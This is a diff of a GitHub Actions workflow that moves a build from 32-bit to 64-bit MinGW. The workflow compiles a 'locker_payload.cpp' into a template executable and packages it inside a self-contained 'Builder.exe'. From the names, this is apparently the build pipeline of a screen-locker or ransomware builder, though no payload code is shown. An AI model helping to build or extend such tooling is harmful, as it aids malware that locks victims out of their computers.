@@ -13,12 +13,10 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v4
 
-    - name: Install MinGW (32-bit and 64-bit)
+    - name: Install MinGW (GCC for Windows)
       run: |
         choco install mingw -y
-        choco install mingw32 -y
         echo "C:\ProgramData\mingw64\mingw64\bin" | Out-File -FilePath $env:GITHUB_PATH -Encoding utf8 -Append
-        echo "C:\ProgramData\mingw32\mingw32\bin" | Out-File -FilePath $env:GITHUB_PATH -Encoding utf8 -Append
 
     - name: Download NASM
       shell: cmd
@@ -47,16 +45,16 @@ jobs:
       with:
         dotnet-version: 6.0.x
 
-    - name: Compile Template (32-bit with mingw32)
+    - name: Compile Template (64-bit)
       shell: cmd
       run: |
-        set PATH=C:\ProgramData\mingw32\mingw32\bin;%PATH%
+        set PATH=C:\ProgramData\mingw64\mingw64\bin;%PATH%
         cd template
         g++ -static -O2 -mwindows locker_payload.cpp -o locker_payload.exe -luser32 -lkernel32 -ladvapi32 -lshlwapi -lntdll
         if exist locker_payload.exe (
           mkdir ..\builder\Resources 2>nul
           copy locker_payload.exe ..\builder\Resources\template.exe
-          echo [SUCCESS] Template compiled (32-bit)
+          echo [SUCCESS] Template compiled (64-bit)
         ) else (
           echo [ERROR] Compilation failed!
           exit /b 1
@@ -69,12 +67,12 @@ jobs:
         dir builder\Resources
         echo ================================
 
-    - name: Build Autonomous Builder (Self-Contained + Single File)
+    - name: Build Universal Builder (AnyCPU + Self-Contained)
       shell: cmd
       run: |
         cd builder
         dotnet restore
-        dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -o ../output
+        dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:Platform=AnyCPU -o ../output
         if exist ..\output\Builder.exe (
           echo [SUCCESS] Builder built successfully
         ) else (
